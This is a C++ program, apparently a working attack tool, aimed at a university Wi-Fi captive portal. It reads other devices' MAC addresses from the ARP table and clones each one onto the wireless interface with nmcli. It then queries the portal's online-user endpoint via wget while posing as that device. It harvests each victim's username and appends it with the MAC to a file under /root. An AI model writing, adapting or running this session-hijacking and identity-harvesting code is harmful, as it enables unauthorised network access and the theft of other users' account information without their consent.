#include <arpa/inet.h>
#include <sys/socket.h> 
#include <ifaddrs.h> 
#include <stdio.h> 
#include <iostream>
#include <stdlib.h>



using namespace std;
string  getip ()
{
    struct ifaddrs *ifap, *ifa;
    struct sockaddr_in *sa;
    char *addr;
    string hasil;
    string interface;

    getifaddrs (&ifap);
    for (ifa = ifap; ifa; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr->sa_family==AF_INET) {
            sa = (struct sockaddr_in *) ifa->ifa_addr;
            addr = inet_ntoa(sa->sin_addr);
	    interface=ifa->ifa_name;
	   hasil=addr;
	}
    }
    freeifaddrs(ifap);
    return hasil;
}

int main(){
	const int size = 256;
   	char ip_address[size];
   	int hw_type;
   	int flags;
   	char mac_address[size];
   	char mask[size];
   	char device[size];
	int jum=0;
	int jummac=0;
	string sina="nmcli con mod ";
	string ssid="";
	string sinb=" 802-11-wireless.cloned-mac-address ";
	string mac="";
	string conn="nmcli d connect wlan1";
	string disc="nmcli d disconnect wlan1";
	string a="wget -q http:/";
	string b="/tune.telkomuniversity.ac.id/eportal/InterFace.do?method=getOnlineUserInfo -O ";
	string ip="";
	char cari[5];
	string find;
	int h;
	char _a;
	string _user;
	int ui=0;
	FILE *data=fopen("/root/datauserpass.txt","a+");
	system("cp /proc/net/arp data");
	cout<<"masukan uuid : ";
	cin>>ssid;
	FILE* fp = fopen("data", "r");
	if(fp == NULL) {
	        perror("Error opening /proc/net/arp");
    	}

    	char line[size];
    	fgets(line, size, fp);    // Skip the first line, which consists of column headers.
    	while(fgets(line, size, fp))
    	{
        	sscanf(line, "%s 0x%x 0x%x %s %s %s\n",
               	ip_address,
               	&hw_type,
               	&flags,
               	mac_address,
               	mask,
               	device);
        	mac=mac_address;
	if (!fopen(mac.c_str(),"r")){
        	if ((mac!="58:69:6c:4c:ad:c7") and (mac!="00:00:00:00:00:00")){
			jummac++;
        		system(disc.c_str());
			system((sina+ssid+sinb+mac).c_str());
			cout<<"plis wait"<<endl;
			do{h=system(conn.c_str());} while (h==1024);
			cout<<h;

			if ((ip!=getip())&&(getip()!="127.0.0.1")){
                        	char c='a';
                        	while (c!='d'){
                                		string d = a+b+mac;
                                		const char *z = d.c_str();
                                		system(z);
						FILE* fl=fopen(mac.c_str(),"r");
						if (getc(fl)==EOF) {fclose(fl);system(("rm "+mac).c_str());}
						else {
							for (int i=1; i<13; i++) getc(fl);
							cari[0]=getc(fl);
							cari[1]=getc(fl);
							cari[2]=getc(fl);
							cari[3]=getc(fl);
							find=cari;
							if (find=="null") {fclose(fl);system(("rm "+mac).c_str());}
							else{
								char _username[]={"        "};
								_user="";
								find="";
								ui=0;
								while (find!="userName"){
									_a=getc(fl);
									if ((_a=='u')&&(ui==0)) {_username[ui]=_a; ui=1;}
									else if ((_a=='s')&&(ui==1)) {_username[ui]=_a;  ui=2;}
									else if ((_a=='e')&&((ui==2)or(ui==7))){_username[ui]=_a; ui=3;}
									else if ((_a=='r')&&(ui==3)) {_username[ui]=_a; ui=4;}
									else if ((_a=='N')&&(ui==4)){_username[ui]=_a; ui=5;}
									else if ((_a=='a')&&(ui==5)){_username[ui]=_a; ui=6;}
									else if ((_a=='m')&&(ui==6)){_username[ui]=_a; ui=7;}
									else ui=0;
									find=_username;
								}
								getc(fl);
								getc(fl);
								getc(fl);
								while((_a=getc(fl))!='"') _user=_user+_a;
//								cout<<_user<<mac<<endl;
								fprintf(data,"%s\t\t\t\t\t\t\t%s\n",_user.c_str(),mac.c_str());
								fclose(fl);
								c='c';
								jum++;
							}
						}
					c++;
				}
                	}
        	}
    	}
	}
    	fclose(fp);
	fclose(data);
	cout<<endl<<"selamat mendapatkan "<<jum<<" dari "<<jummac<<endl;
	return 0;
}
